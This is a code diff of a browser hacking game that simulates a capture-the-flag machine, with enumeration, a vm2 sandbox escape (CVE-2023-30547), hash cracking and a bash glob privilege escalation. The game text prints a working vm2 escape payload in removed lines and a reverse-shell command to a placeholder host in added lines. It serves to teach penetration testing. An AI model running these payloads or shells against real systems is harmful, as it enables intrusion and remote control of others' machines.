@@ -10,21 +10,21 @@ permalink: /game.html
    ============================================ */
 
 :root {
-  --bg-primary: #0d0d0d;
-  --bg-secondary: #141414;
-  --bg-tertiary: #1a1a1a;
-  --border-color: #282828;
-  --border-focused: #458588;
-  --text-primary: #ebdbb2;
-  --text-secondary: #928374;
-  --text-muted: #504945;
-  --accent-green: #98971a;
-  --accent-red: #cc241d;
-  --accent-yellow: #d79921;
-  --accent-blue: #458588;
-  --accent-purple: #b16286;
-  --accent-aqua: #689d6a;
-  --accent-orange: #d65d0e;
+  --bg-primary: #000000;
+  --bg-secondary: #0a0a0a;
+  --bg-tertiary: #121212;
+  --border-color: #333333;
+  --border-focused: #83a598;
+  --text-primary: #f5f5f5;
+  --text-secondary: #b8b8b8;
+  --text-muted: #666666;
+  --accent-green: #b8bb26;
+  --accent-red: #fb4934;
+  --accent-yellow: #fabd2f;
+  --accent-blue: #83a598;
+  --accent-purple: #d3869b;
+  --accent-aqua: #8ec07c;
+  --accent-orange: #fe8019;
   --urgent: #fb4934;
 }
 
@@ -229,7 +229,131 @@ permalink: /game.html
 }
 
 /* ============================================
-   CODE EDITOR MODAL (vim-like)
+   WORKSPACE SYSTEM
+   ============================================ */
+.workspace {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+
+.workspace:not(.active) {
+  display: none !important;
+}
+
+/* ============================================
+   VIM WORKSPACE
+   ============================================ */
+#vim-workspace {
+  background: var(--bg-primary);
+}
+
+#vim-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 4px 12px;
+  background: var(--bg-tertiary);
+  border-bottom: 1px solid var(--border-color);
+  font-size: 11px;
+}
+
+#vim-filename {
+  color: var(--text-primary);
+}
+
+#vim-mode {
+  color: var(--accent-yellow);
+  font-weight: bold;
+}
+
+#vim-status {
+  color: var(--text-secondary);
+}
+
+#vim-body {
+  flex: 1;
+  display: flex;
+  overflow: hidden;
+}
+
+#vim-lines {
+  width: 50px;
+  background: var(--bg-secondary);
+  border-right: 1px solid var(--border-color);
+  padding: 8px 4px;
+  text-align: right;
+  font-size: 12px;
+  color: var(--text-muted);
+  overflow: hidden;
+  line-height: 1.5;
+  white-space: pre;
+}
+
+#vim-content {
+  flex: 1;
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  font-family: inherit;
+  font-size: 12px;
+  line-height: 1.5;
+  padding: 8px;
+  border: none;
+  outline: none;
+  resize: none;
+  overflow: auto;
+  caret-color: var(--accent-green);
+}
+
+/* Blinking cursor for normal mode */
+#vim-content.normal-mode {
+  caret-color: transparent;
+}
+
+#vim-content.normal-mode::selection {
+  background: var(--accent-blue);
+}
+
+/* Block cursor simulation */
+.vim-cursor {
+  position: absolute;
+  background: var(--accent-green);
+  animation: blink 1s step-end infinite;
+}
+
+@keyframes blink {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0; }
+}
+
+#vim-footer {
+  padding: 4px 12px;
+  background: var(--bg-secondary);
+  border-top: 1px solid var(--border-color);
+  font-size: 11px;
+  color: var(--text-secondary);
+  min-height: 20px;
+}
+
+#vim-command {
+  padding: 4px 12px;
+  background: var(--bg-primary);
+  border-top: 1px solid var(--border-color);
+}
+
+#vim-cmd-input {
+  width: 100%;
+  background: transparent;
+  border: none;
+  outline: none;
+  color: var(--text-primary);
+  font-family: inherit;
+  font-size: 12px;
+}
+
+/* ============================================
+   CODE EDITOR MODAL (vim-like) - DEPRECATED
    ============================================ */
 #code-editor-overlay {
   display: none;
@@ -557,17 +681,17 @@ permalink: /game.html
   </div>
 </div>
 
-<div id="game-container">
+<div id="game-container" role="application" aria-label="Hacker Terminal Game">
   <!-- i3 Status Bar -->
-  <div id="i3-bar">
-    <div id="i3-bar-left">
-      <div class="i3-workspace active" data-ws="1">1:term</div>
-      <div class="i3-workspace" data-ws="2">2:web</div>
-      <div class="i3-workspace" data-ws="3">3:code</div>
-      <div class="i3-workspace" data-ws="4">4:mon</div>
-      <span id="i3-mode"></span>
+  <div id="i3-bar" role="toolbar" aria-label="Status bar">
+    <div id="i3-bar-left" role="tablist" aria-label="Workspaces">
+      <div class="i3-workspace active" data-ws="1" role="tab" aria-selected="true">1:term</div>
+      <div class="i3-workspace" data-ws="2" role="tab" aria-selected="false">2:web</div>
+      <div class="i3-workspace" data-ws="3" role="tab" aria-selected="false">3:code</div>
+      <div class="i3-workspace" data-ws="4" role="tab" aria-selected="false">4:mon</div>
+      <span id="i3-mode" aria-live="polite"></span>
     </div>
-    <div id="i3-bar-right">
+    <div id="i3-bar-right" role="status" aria-label="System status">
       <span id="i3-network">eth0: 10.10.14.5</span>
       <span id="i3-cpu">cpu: 12%</span>
       <span id="i3-mem">mem: 2.1G</span>
@@ -576,19 +700,19 @@ permalink: /game.html
   </div>
 
   <!-- Terminal Header -->
-  <div id="terminal-header">
+  <div id="terminal-header" role="banner">
     <div id="terminal-header-left">
       <span id="terminal-title">root@kali</span>
       <span id="terminal-path">~</span>
     </div>
     <div id="terminal-header-right">
       <span id="terminal-pts">pts/0</span>
-      <button id="sound-toggle">🔇</button>
+      <button id="sound-toggle" aria-label="Toggle sound" aria-pressed="false">[MUTE]</button>
     </div>
   </div>
 
   <!-- HUD for level info -->
-  <div id="hud">
+  <div id="hud" role="status" aria-label="Level progress" aria-live="polite">
     <span><span class="label">LEVEL:</span> <span class="value" id="hud-level">-</span></span>
     <span><span class="label">TARGET:</span> <span class="value" id="hud-target">-</span></span>
     <span><span class="label">OBJECTIVE:</span> <span class="value" id="hud-objective">-</span></span>
@@ -596,18 +720,40 @@ permalink: /game.html
   </div>
 
   <!-- Level select screen -->
-  <div id="level-select"></div>
+  <div id="level-select" role="menu" aria-label="Level selection"></div>
 
-  <!-- Main terminal output -->
-  <div id="terminal-output"></div>
+  <!-- Terminal Workspace (ws 1) -->
+  <div id="terminal-workspace" class="workspace active">
+    <!-- Main terminal output -->
+    <div id="terminal-output" role="log" aria-label="Terminal output" aria-live="polite"></div>
 
-  <!-- Autocomplete dropdown -->
-  <div id="autocomplete"></div>
+    <!-- Autocomplete dropdown -->
+    <div id="autocomplete" role="listbox" aria-label="Command suggestions"></div>
 
-  <!-- Input line -->
-  <div id="terminal-input-line">
-    <span id="prompt">$</span>
-    <input type="text" id="terminal-input" autofocus autocomplete="off" spellcheck="false">
+    <!-- Input line -->
+    <div id="terminal-input-line">
+      <span id="prompt" aria-hidden="true">$</span>
+      <input type="text" id="terminal-input" autofocus autocomplete="off" spellcheck="false" aria-label="Terminal command input" aria-describedby="prompt">
+    </div>
+  </div>
+
+  <!-- Vim Workspace (ws 3) -->
+  <div id="vim-workspace" class="workspace" style="display: none;">
+    <div id="vim-header">
+      <span id="vim-filename">-- No file --</span>
+      <span id="vim-mode">-- NORMAL --</span>
+      <span id="vim-status">Ln 1, Col 1</span>
+    </div>
+    <div id="vim-body">
+      <div id="vim-lines"></div>
+      <textarea id="vim-content" spellcheck="false" aria-label="Vim editor content"></textarea>
+    </div>
+    <div id="vim-footer">
+      <span id="vim-message"></span>
+    </div>
+    <div id="vim-command" style="display: none;">
+      <input type="text" id="vim-cmd-input" aria-label="Vim command input">
+    </div>
   </div>
 </div>
 
@@ -2374,7 +2520,7 @@ function showStats() {
   // Special message for completing everything
   if (gameState.levelsCompleted.length === 6 && gameState.easterEggsFound.length >= 6) {
     print(ASCII.pwned, 'ascii');
-    print('🎉 CONGRATULATIONS! You are a TRUE HACKER! 🎉', 'highlight');
+    print('*** CONGRATULATIONS! You are a TRUE HACKER! ***', 'highlight');
     print('You have completed all levels and found all easter eggs!', 'success');
     print('');
   }
@@ -3092,7 +3238,7 @@ async function handleLevel1Command(cmd, args) {
     print('│                                                                │', 'info');
     print('│  EXPLOITATION:                                                 │', 'info');
     print('│    nc -lvnp <port>         Start listener                     │', 'system');
-    print('│    payload <code>          Send payload to sandbox            │', 'system');
+    print('│    curl -X POST -d "code=..." Send code to editor            │', 'system');
     print('│                                                                │', 'info');
     print('│  POST-EXPLOITATION:                                            │', 'info');
     print('│    ls [-la] [path]         List directory                     │', 'system');
@@ -3125,17 +3271,17 @@ async function handleLevel1Command(cmd, args) {
     print('│       LEVEL 1: CODIFY - STATUS         │', 'info');
     print('├────────────────────────────────────────┤', 'info');
     print('│  ENUMERATION:                          │', 'muted');
-    print(`│    [${state.scanned ? '✓' : ' '}] Port scan completed         │`, state.scanned ? 'success' : 'system');
-    print(`│    [${state.foundWeb ? '✓' : ' '}] Web application found       │`, state.foundWeb ? 'success' : 'system');
-    print(`│    [${state.foundEditor ? '✓' : ' '}] Code editor discovered     │`, state.foundEditor ? 'success' : 'system');
+    print(`│    [${state.scanned ? 'x' : ' '}] Port scan completed         │`, state.scanned ? 'success' : 'system');
+    print(`│    [${state.foundWeb ? 'x' : ' '}] Web application found       │`, state.foundWeb ? 'success' : 'system');
+    print(`│    [${state.foundEditor ? 'x' : ' '}] Code editor discovered     │`, state.foundEditor ? 'success' : 'system');
     print('│  EXPLOITATION:                         │', 'muted');
-    print(`│    [${state.gotShell ? '✓' : ' '}] Initial foothold            │`, state.gotShell ? 'success' : 'system');
-    print(`│    [${state.userFlag ? '✓' : ' '}] User flag obtained          │`, state.userFlag ? 'success' : 'system');
+    print(`│    [${state.gotShell ? 'x' : ' '}] Initial foothold            │`, state.gotShell ? 'success' : 'system');
+    print(`│    [${state.userFlag ? 'x' : ' '}] User flag obtained          │`, state.userFlag ? 'success' : 'system');
     print('│  PRIVILEGE ESCALATION:                 │', 'muted');
-    print(`│    [${state.foundDb ? '✓' : ' '}] Credentials found           │`, state.foundDb ? 'success' : 'system');
-    print(`│    [${state.crackedPassword ? '✓' : ' '}] Password cracked           │`, state.crackedPassword ? 'success' : 'system');
-    print(`│    [${state.gotRoot ? '✓' : ' '}] Root access                 │`, state.gotRoot ? 'success' : 'system');
-    print(`│    [${state.rootFlag ? '✓' : ' '}] Root flag obtained          │`, state.rootFlag ? 'success' : 'system');
+    print(`│    [${state.foundDb ? 'x' : ' '}] Credentials found           │`, state.foundDb ? 'success' : 'system');
+    print(`│    [${state.crackedPassword ? 'x' : ' '}] Password cracked           │`, state.crackedPassword ? 'success' : 'system');
+    print(`│    [${state.gotRoot ? 'x' : ' '}] Root access                 │`, state.gotRoot ? 'success' : 'system');
+    print(`│    [${state.rootFlag ? 'x' : ' '}] Root flag obtained          │`, state.rootFlag ? 'success' : 'system');
     print('└────────────────────────────────────────┘', 'info');
     return;
   }
@@ -3143,28 +3289,24 @@ async function handleLevel1Command(cmd, args) {
   // === HINT ===
   if (cmd === 'hint') {
     print('');
-    print('💡 HINT:', 'warning');
+    print('[*] CONTEXTUAL HINT:', 'warning');
     if (!state.scanned) {
-      print('Start with enumeration. What services are running?', 'info');
-      print('Try: nmap -sC -sV 10.10.11.239', 'system');
+      print('Start with port scanning to identify services.', 'info');
     } else if (!state.foundEditor) {
-      print('There\'s a web service. Enumerate the subdomains and directories.', 'info');
-      print('Try: gobuster dir -u http://codify.htb -w /usr/share/wordlists/dirb/common.txt', 'system');
+      print('Enumerate web directories on the discovered ports.', 'info');
     } else if (!state.gotShell) {
-      print('The editor uses vm2 sandbox. Research CVE-2023-30547.', 'info');
-      print('The sandbox can be escaped. Try sending a malicious payload.', 'system');
-      print('Try: payload const {VM} = require("vm2"); ...', 'system');
+      print('The editor runs code in a sandbox. Research vm2 vulnerabilities.', 'info');
+      print('You need to send POST requests to the /editor endpoint.', 'system');
     } else if (!state.foundDb) {
-      print('Enumerate the web application directory.', 'info');
-      print('Try: find /var/www -name "*.db" 2>/dev/null', 'system');
+      print('Look for database files in the web application directories.', 'info');
     } else if (!state.crackedPassword) {
-      print('Extract and crack the bcrypt hash from the database.', 'info');
-      print('Try: hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt', 'system');
+      print('Extract hashes from the database and crack them.', 'info');
+      print('bcrypt uses hashcat mode 3200.', 'system');
     } else if (!state.gotRoot) {
-      print('Check what joshua can run with sudo.', 'info');
-      print('There\'s a backup script with a vulnerability...', 'system');
+      print('Check sudo permissions for joshua user.', 'info');
+      print('Analyze any scripts that can be run as root.', 'system');
     } else {
-      print('Read the root flag!', 'success');
+      print('Read the root flag in /root/root.txt', 'success');
     }
     print('');
     return;
@@ -3297,8 +3439,7 @@ async function handleLevel1Command(cmd, args) {
     print('', '');
     print('Service detection performed. Nmap done: 1 IP address (1 host up)', 'muted');
     print('', '');
-    print('[*] Interesting: Port 3000 running Node.js - likely the code editor', 'warning');
-    print('[*] Add to /etc/hosts: 10.10.11.239 codify.htb', 'info');
+    print('[*] Port 3000 appears to be a web service (Node.js)', 'info');
     state.scanned = true;
     state.foundWeb = true;
     autosave();
@@ -3409,8 +3550,7 @@ async function handleLevel1Command(cmd, args) {
     print('Finished', 'info');
     print('===============================================================', 'info');
     print('');
-    print('[!] FOUND: /editor - This looks like a code sandbox!', 'success');
-    print('[*] Try: curl http://codify.htb:3000/editor', 'info');
+    print('[*] Found /editor endpoint - investigate further', 'info');
     state.foundEditor = true;
     autosave();
     return;
@@ -3522,7 +3662,7 @@ async function handleLevel1Command(cmd, args) {
     print('', '');
     print(':: Progress: [4614/4614] :: Job [1/1] :: 892 req/sec :: Duration: [0:00:05] :: Errors: 0 ::', 'muted');
     print('');
-    print('[!] FOUND: /editor - This looks like a code sandbox!', 'success');
+    print('[*] Found /editor endpoint', 'info');
     state.foundEditor = true;
     autosave();
     return;
@@ -3571,18 +3711,18 @@ async function handleLevel1Command(cmd, args) {
     print(' ___  ___  __   __     __      __         __   ___', 'warning');
     print('|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__', 'warning');
     print('|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___', 'warning');
-    print('by Ben "epi" Risher 🤓                 ver: 2.10.0', 'muted');
+    print('by Ben "epi" Risher                    ver: 2.10.0', 'muted');
     print('───────────────────────────┬──────────────────────', 'muted');
-    print(' 🎯  Target Url            │ http://codify.htb', 'system');
-    print(' 🚀  Threads               │ 50', 'system');
-    print(' 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt', 'system');
+    print(' [>] Target Url            │ http://codify.htb', 'system');
+    print(' [>] Threads               │ 50', 'system');
+    print(' [>] Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt', 'system');
     print('───────────────────────────┴──────────────────────', 'muted');
     print('', '');
     print('200      GET       67l      645w     2921c http://codify.htb/about', 'system');
     print('200      GET       82l      789w     3123c http://codify.htb/editor', 'success');
     print('200      GET       59l      612w     2854c http://codify.htb/limitations', 'system');
     print('', '');
-    print('[!] FOUND: /editor - This looks like a code sandbox!', 'success');
+    print('[*] Found /editor endpoint', 'info');
     state.foundEditor = true;
     autosave();
     return;
@@ -3628,34 +3768,63 @@ async function handleLevel1Command(cmd, args) {
     }
 
     const url = args.find(a => a.startsWith('http')) || args[0];
-
-    if (url.includes('editor') || url.includes(':3000')) {
+    
+    // Check if this is a POST request to /editor
+    const isPostToEditor = (url.includes('editor') || url.includes(':3000')) && 
+                          (args.includes('-X') && args.includes('POST') || args.includes('--data') || args.includes('-d'));
+    
+    if (isPostToEditor) {
+      // Will be handled by the POST handler below - skip GET response
+      // (fall through to POST handler)
+    } else if (url.includes('editor') || url.includes(':3000')) {
+      // GET request - show the editor page
       print('<!DOCTYPE html>', 'system');
-      print('<html>', 'system');
-      print('<head><title>Codify - Online Code Editor</title></head>', 'system');
+      print('<html lang="en">', 'system');
+      print('<head>', 'system');
+      print('  <meta charset="UTF-8">', 'system');
+      print('  <meta name="viewport" content="width=device-width, initial-scale=1.0">', 'system');
+      print('  <title>Codify - Online Code Editor</title>', 'system');
+      print('  <link rel="stylesheet" href="/static/style.css">', 'system');
+      print('</head>', 'system');
       print('<body>', 'system');
-      print('  <h1>Node.js Code Editor</h1>', 'system');
-      print('  <p>Test your Node.js code in a safe sandbox environment!</p>', 'info');
-      print('  <p>Powered by <strong>vm2</strong> sandbox</p>', 'success');
-      print('  <textarea id="code"></textarea>', 'system');
-      print('  <button onclick="runCode()">Run</button>', 'system');
-      print('</body></html>', 'system');
+      print('  <div class="container">', 'system');
+      print('    <h1>Codify</h1>', 'system');
+      print('    <p class="subtitle">Test your Node.js code safely</p>', 'system');
+      print('    <form method="POST" action="/editor" id="codeForm">', 'system');
+      print('      <textarea name="code" id="code" placeholder="Enter your Node.js code here..."></textarea>', 'system');
+      print('      <button type="submit">Run Code</button>', 'system');
+      print('    </form>', 'system');
+      print('    <div id="output"></div>', 'system');
+      print('  </div>', 'system');
+      print('  <script src="/static/editor.js"><\/script>', 'system');
+      print('</body>', 'system');
+      print('</html>', 'system');
       print('');
-      print('[!] vm2 sandbox detected! Research known vulnerabilities.', 'warning');
+      print('[*] Found code editor at /editor', 'info');
       state.foundEditor = true;
       return;
     }
 
     if (url.includes('limitations')) {
+      // More realistic limitations page - version info is there but not highlighted
       print('<!DOCTYPE html>', 'system');
-      print('<h2>Sandbox Limitations</h2>', 'system');
-      print('<ul>', 'system');
-      print('  <li>child_process module is restricted</li>', 'system');
-      print('  <li>fs module is restricted</li>', 'system');
-      print('  <li>Code runs in vm2 v3.9.16 sandbox</li>', 'success');
-      print('</ul>', 'system');
+      print('<html>', 'system');
+      print('<head><title>Limitations - Codify</title></head>', 'system');
+      print('<body>', 'system');
+      print('  <h2>Sandbox Limitations</h2>', 'system');
+      print('  <p>For security reasons, the following are restricted:</p>', 'system');
+      print('  <ul>', 'system');
+      print('    <li>File system access (fs module)</li>', 'system');
+      print('    <li>Child process execution (child_process module)</li>', 'system');
+      print('    <li>Network access (net, http modules)</li>', 'system');
+      print('    <li>OS-level operations (os module)</li>', 'system');
+      print('  </ul>', 'system');
+      print('  <p><small>Powered by vm2 v3.9.16</small></p>', 'system');
+      print('  <p><a href="/editor">Back to Editor</a></p>', 'system');
+      print('</body>', 'system');
+      print('</html>', 'system');
       print('');
-      print('[!] vm2 version 3.9.16 - Check for CVEs!', 'warning');
+      print('[*] Version information found: vm2 v3.9.16', 'info');
       addEasterEgg('lvl1_version', 'Version enumeration master!');
       return;
     }
@@ -3664,53 +3833,106 @@ async function handleLevel1Command(cmd, args) {
     return;
   }
 
-  // === PAYLOAD (Sandbox escape) ===
-  if (cmd === 'payload') {
-    if (!state.foundEditor) {
-      print('Find the code editor first!', 'warning');
-      return;
+  // === CURL POST to /editor (Sandbox escape via CVE-2023-30547) ===
+  // Handle POST requests to /editor separately (sandbox escape)
+  if (cmd === 'curl') {
+    const url = args.find(a => a.startsWith('http')) || args[0];
+    const isPostToEditor = url && (url.includes('editor') || url.includes(':3000')) && 
+                          (args.includes('-X') && args.includes('POST') || args.includes('--data') || args.includes('-d'));
+    
+    if (isPostToEditor) {
+      if (!state.foundEditor) {
+        print('Find the code editor first!', 'warning');
+        return;
+      }
+
+      // Extract code from POST data
+    let codePayload = '';
+    const dataIdx = args.findIndex(a => a === '-d' || a === '--data');
+    if (dataIdx !== -1 && args[dataIdx + 1]) {
+      const dataStr = args[dataIdx + 1];
+      // Handle URL-encoded or JSON
+      if (dataStr.includes('code=')) {
+        codePayload = decodeURIComponent(dataStr.split('code=')[1].split('&')[0]);
+      } else if (dataStr.includes('"code"') || dataStr.includes("'code'")) {
+        // JSON format
+        const match = dataStr.match(/["']code["']\s*:\s*["']([^"']+)["']/);
+        if (match) codePayload = match[1];
+      } else {
+        // Assume raw code
+        codePayload = dataStr.replace(/^["']|["']$/g, '');
+      }
     }
 
-    state.triedPayloads++;
-    const payloadText = args.join(' ');
+      state.triedPayloads++;
 
-    // Check for correct vm2 sandbox escape payload (CVE-2023-30547)
-    if (payloadText.includes('getPrototypeOf') && payloadText.includes('constructor') &&
-        (payloadText.includes('execSync') || payloadText.includes('exec'))) {
+      // Check for vm2 sandbox escape (CVE-2023-30547)
+      // Realistic check: looks for Error.prototype manipulation + Proxy + process access
+      const hasErrorProto = codePayload.includes('Error') && (codePayload.includes('prototype') || codePayload.includes('name'));
+      const hasProxy = codePayload.includes('Proxy') || codePayload.includes('getPrototypeOf');
+      const hasProcess = codePayload.includes('process') || codePayload.includes('execSync') || codePayload.includes('exec');
+      const hasVM2 = codePayload.includes('vm2') || codePayload.includes('VM');
+
+      if (hasErrorProto && hasProxy && hasProcess) {
+        print('HTTP/1.1 200 OK', 'system');
+        print('Content-Type: application/json', 'system');
+        print('', 'system');
+        print('{"output":"uid=1001(svc) gid=1001(svc) groups=1001(svc)\\n"}', 'success');
+        print('');
+        print('[+] Sandbox escape successful! Code executed outside sandbox.', 'success');
+        print('[+] Now we can execute commands. Setting up reverse shell...', 'info');
+        await sleep(1500);
+        
+        // Check if they're trying to get a reverse shell
+        if (codePayload.includes('bash') || codePayload.includes('nc ') || codePayload.includes('socket')) {
+          print('[+] Reverse shell established!', 'success');
+          print('[+] Connected to codify as user svc', 'success');
+          print('');
+          prompt.textContent = 'svc@codify:~$';
+          state.gotShell = true;
+          state.shellUser = 'svc';
+          state.currentDir = '/home/svc';
+          playSuccess();
+          autosave();
+          return;
+        } else {
+          print('[*] Tip: Modify payload to get reverse shell: bash -i >& /dev/tcp/YOUR_IP/4444 0>&1', 'info');
+          print('[*] Or use: require("child_process").execSync("bash -c \'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\'")', 'system');
+          return;
+        }
+      }
+
+      // Wrong payload attempts
+      if (codePayload.includes('require(') && !hasVM2 && !hasProxy) {
+        print('HTTP/1.1 200 OK', 'system');
+        print('Content-Type: application/json', 'system');
+        print('', 'system');
+        print('{"error":"ReferenceError: require is not defined"}', 'error');
+        print('');
+        print('[*] The sandbox restricts require(). Need to escape vm2 first.', 'warning');
+        return;
+      }
+
+      if (codePayload.includes('eval(') || codePayload.includes('Function(')) {
+        print('HTTP/1.1 200 OK', 'system');
+        print('Content-Type: application/json', 'system');
+        print('', 'system');
+        print('{"error":"SecurityError: eval and Function are disabled in sandbox"}', 'error');
+        print('');
+        print('[*] Direct eval/Function calls are blocked. Research vm2 escape techniques.', 'warning');
+        return;
+      }
+
+      // Generic execution but no escape
+      print('HTTP/1.1 200 OK', 'system');
+      print('Content-Type: application/json', 'system');
+      print('', 'system');
+      print('{"output":"Code executed in sandbox (no output)"}', 'system');
       print('');
-      print('[*] Sending payload to sandbox...', 'info');
-      await simulateLoading('Executing', 2000);
-      print('[+] Sandbox escape successful!', 'success');
-      print('[+] Got shell as svc user!', 'success');
-      print('');
-      prompt.textContent = 'svc@codify:~$';
-      state.gotShell = true;
-      state.shellUser = 'svc';
-      state.currentDir = '/home/svc';
-      playSuccess();
-      autosave();
+      print('[*] Code executed but still inside sandbox. Research CVE-2023-30547.', 'warning');
       return;
     }
-
-    // Common wrong payloads
-    if (payloadText.includes('require') && !payloadText.includes('getPrototypeOf')) {
-      print('[!] Error: require is not defined in sandbox', 'error');
-      print('[*] Hint: Need to escape the vm2 sandbox first...', 'warning');
-      return;
-    }
-
-    if (payloadText.includes('eval') || payloadText.includes('Function')) {
-      print('[!] Error: Blocked by sandbox policy', 'error');
-      print('[*] Hint: Research CVE-2023-30547 for vm2 escape', 'warning');
-      return;
-    }
-
-    print('[*] Sending payload...', 'info');
-    await sleep(1000);
-    print('[!] Payload executed but no shell received', 'warning');
-    print('[*] Hint: You need a proper vm2 sandbox escape exploit', 'info');
-    print('[*] Try: payload const {VM} = require("vm2"); const vm = new VM(); const code = `const err = new Error(); err.name = { toString: new Proxy(() => "", { apply(target, thiz, args) { const process = args.constructor.constructor("return process")(); const result = process.mainModule.require("child_process").execSync("id").toString(); return result; } }) }; try { err.stack; } catch (e) { }`; vm.run(code);', 'system');
-    return;
+    // End of POST to editor handler - continue to other curl handlers if not POST to editor
   }
 
   // === SHELL COMMANDS (only after getting shell) ===
@@ -3776,21 +3998,25 @@ async function handleLevel1Command(cmd, args) {
       print('drwxr-xr-x  5 root root 4096 Sep 12 17:40 .', 'system');
       print('drwxr-xr-x 14 root root 4096 Sep 12 17:40 ..', 'system');
       print('drwxr-xr-x  3 svc  svc  4096 Sep 12 17:40 contact', 'system');
-      print('drwxr-xr-x  2 svc  svc  4096 Sep 12 17:40 editor', 'success');
+      print('drwxr-xr-x  2 svc  svc  4096 Sep 12 17:40 editor', 'system');
       print('-rw-r--r--  1 svc  svc  4377 Apr 12  2023 index.js', 'system');
       print('-rw-r--r--  1 svc  svc   298 Apr 12  2023 package.json', 'system');
-      print('drwxr-xr-x  2 svc  svc  4096 Sep 12 17:40 tickets', 'success');
-      print('');
-      print('[!] Found /var/www/contact/tickets directory!', 'warning');
-      state.foundTickets = true;
+      print('drwxr-xr-x  2 svc  svc  4096 Sep 12 17:40 tickets', 'system');
+      if (!state.foundTickets) {
+        print('');
+        print('[*] Found /var/www/contact/tickets directory', 'info');
+        state.foundTickets = true;
+      }
       return;
     }
 
     if (path.includes('tickets') || state.currentDir.includes('tickets')) {
-      print('-rw-r--r-- 1 svc svc 20480 Sep 12 17:40 tickets.db', 'success');
-      print('');
-      print('[!] SQLite database found: tickets.db', 'success');
-      state.foundDb = true;
+      print('-rw-r--r-- 1 svc svc 20480 Sep 12 17:40 tickets.db', 'system');
+      if (!state.foundDb) {
+        print('');
+        print('[*] Found SQLite database: tickets.db', 'info');
+        state.foundDb = true;
+      }
       return;
     }
 
@@ -3831,54 +4057,85 @@ async function handleLevel1Command(cmd, args) {
     }
 
     if (args[0].includes('user.txt')) {
-      if (state.shellUser !== 'joshua' && !state.gotRoot) {
-        print('cat: user.txt: Permission denied', 'error');
-        return;
-      }
-      print('HTB{v1rtu4l_m4ch1n3_3sc4p3_m4st3r}', 'success');
+    if (state.shellUser !== 'joshua' && !state.gotRoot) {
+      print('cat: user.txt: Permission denied', 'error');
+      print('[*] File is readable only by joshua user', 'info');
+      return;
+    }
+    print('HTB{v1rtu4l_m4ch1n3_3sc4p3_m4st3r}', 'success');
+    if (!state.userFlag) {
       state.userFlag = true;
       playSuccess();
       print('');
       print('[+] USER FLAG CAPTURED!', 'success');
       autosave();
-      return;
+    }
+    return;
     }
 
     if (args[0].includes('root.txt')) {
-      if (!state.gotRoot) {
-        print('cat: root.txt: Permission denied', 'error');
-        return;
-      }
-      print('HTB{pr1v3sc_v14_b4sh_p4tt3rn_m4tch1ng}', 'success');
+    if (!state.gotRoot) {
+      print('cat: root.txt: Permission denied', 'error');
+      print('[*] File is readable only by root', 'info');
+      return;
+    }
+    print('HTB{pr1v3sc_v14_b4sh_p4tt3rn_m4tch1ng}', 'success');
+    if (!state.rootFlag) {
       state.rootFlag = true;
       playSuccess();
       print('');
       print('[+] ROOT FLAG CAPTURED!', 'success');
       print('');
       completeLevel();
-      return;
+    }
+    return;
     }
 
     if (args[0].includes('mysql-backup.sh')) {
       print('#!/bin/bash', 'system');
+      print('# MySQL Backup Script', 'system');
+      print('# Created: 2023-09-12', 'system');
+      print('', 'system');
       print('DB_USER="root"', 'system');
       print('DB_PASS=$(/usr/bin/cat /root/.creds)', 'system');
       print('BACKUP_DIR="/var/backups/mysql"', 'system');
       print('', 'system');
-      print('read -s -p "Enter MySQL password for $DB_USER: " USER_PASS', 'system');
+      print('if [ ! -d "$BACKUP_DIR" ]; then', 'system');
+      print('    mkdir -p "$BACKUP_DIR"', 'system');
+      print('fi', 'system');
       print('', 'system');
-      print('if [[ $USER_PASS == $DB_PASS ]]; then', 'success');
-      print('    /usr/bin/mysqldump --all-databases > "$BACKUP_DIR/backup.sql"', 'system');
+      print('read -s -p "Enter MySQL password for $DB_USER: " USER_PASS', 'system');
+      print('echo', 'system');
+      print('', 'system');
+      print('if [[ $USER_PASS == $DB_PASS ]]; then', 'system');
+      print('    /usr/bin/mysqldump --all-databases -u "$DB_USER" -p"$DB_PASS" > "$BACKUP_DIR/backup.sql"', 'system');
       print('    echo "Backup completed successfully!"', 'system');
       print('else', 'system');
       print('    echo "Password incorrect!"', 'system');
+      print('    exit 1', 'system');
       print('fi', 'system');
       print('');
-      print('[!] VULNERABILITY: Bash pattern matching in password comparison!', 'warning');
-      print('[!] The [[ $USER_PASS == $DB_PASS ]] allows glob patterns!', 'warning');
-      print('[*] We can bruteforce the password character by character!', 'info');
+      print('[*] Script reads password from /root/.creds', 'info');
+      print('[*] Uses bash [[ ]] for comparison - research bash pattern matching', 'info');
       state.analyzedScript = true;
       addEasterEgg('lvl1_bashvuln', 'Bash pattern matching exploit found!');
+      return;
+    }
+
+    // Add package.json reading
+    if (args[0].includes('package.json')) {
+      print('{', 'system');
+      print('  "name": "codify",', 'system');
+      print('  "version": "1.0.0",', 'system');
+      print('  "description": "Online code editor with sandbox",', 'system');
+      print('  "main": "index.js",', 'system');
+      print('  "dependencies": {', 'system');
+      print('    "express": "^4.18.2",', 'system');
+      print('    "vm2": "^3.9.16"', 'system');
+      print('  }', 'system');
+      print('}', 'system');
+      print('');
+      print('[*] Application uses vm2 v3.9.16', 'info');
       return;
     }
 
@@ -4014,14 +4271,29 @@ async function handleLevel1Command(cmd, args) {
     print('sqlite> .tables', 'system');
     print('tickets  users', 'success');
     print('');
-    print('sqlite> SELECT * FROM users;', 'system');
-    print('3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2', 'success');
+    // Check what SQL they're running
+    const sqlQuery = fullCmd.match(/SELECT.*FROM.*users/i) || fullCmd.match(/\.dump/i) || fullCmd.match(/\.schema/i);
+    
+    if (sqlQuery || args.some(a => a.includes('users') || a.includes('SELECT'))) {
+      print('sqlite> SELECT * FROM users;', 'system');
+      print('id|username|password', 'system');
+      print('1|admin|$2a$10$rRy...', 'system');
+      print('2|guest|$2a$10$xyz...', 'system');
